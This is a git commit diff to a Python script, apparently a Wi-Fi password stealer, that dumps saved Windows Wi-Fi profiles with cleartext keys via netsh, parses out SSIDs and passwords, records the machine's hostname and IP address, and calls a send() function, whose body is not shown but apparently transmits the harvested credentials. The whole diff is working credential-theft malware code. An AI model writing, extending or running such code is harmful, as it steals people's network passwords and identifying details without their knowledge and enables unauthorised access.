1a650cc8f818f96e50538e55752e922ac863ae57
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-18 21:00:14 +0200

    Update main.py

--- main.py
+++ main.py
@@ -4,17 +4,18 @@ import sys
 import requests
 import json
 import threading
+import socket
 
 
 password_file = open("notes.txt", "w", encoding="utf-8")
-password_file.write("Password List: \n")
+password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
 password_file.close()
 
 wifi_files = []
 wifi_name = []
 wifi_password = []
 
-subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
+#subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
 #os.system("netsh wlan export profile key=clear")
 
 path = os.getcwd()
@@ -42,23 +43,24 @@ def send():
 for file_name in os.listdir(path):
     if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
         wifi_files.append(file_name)
-        for i in wifi_files:
-            with open(i, "r") as f:
-                for line in f.readlines():
-                    if "name" in line:
-                        stripped = line.strip()
-                        front = stripped[6:]
-                        back = front[:-7]
-                        wifi_name.append(back)
-                    if "keyMaterial" in line:
-                        stripped = line.strip()
-                        front = stripped[13:]
-                        back = front[:-14]
-                        wifi_password.append(back)
-                        for x, y in zip(wifi_name, wifi_password):
-                            sys.stdout = open("notes.txt", "a", encoding="utf-8")
-                            #sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
-                            print(f"SSID: {x} Password: {y}", sep = "\n")
-                            sys.stdout.close()
-                            send()
+        
+for i in wifi_files:
+    with open(i, "r") as f:
+        for line in f.readlines():
+            if "name" in line:
+                stripped = line.strip()
+                front = stripped[6:]
+                back = front[:-7]
+                wifi_name.append(back)
+            if "keyMaterial" in line:
+                stripped = line.strip()
+                front = stripped[13:]
+                back = front[:-14]
+                wifi_password.append(back)
+                for x, y in zip(wifi_name, wifi_password):
+                    sys.stdout = open("notes.txt", "a", encoding="utf-8")
+                    #sys.stdout.write(f"SSID: {x} Password: {y}", sep = "\n")
+                    print(f"SSID: {x} Password: {y}", sep = "\n")
+                    sys.stdout.close()
+                    send()
                             
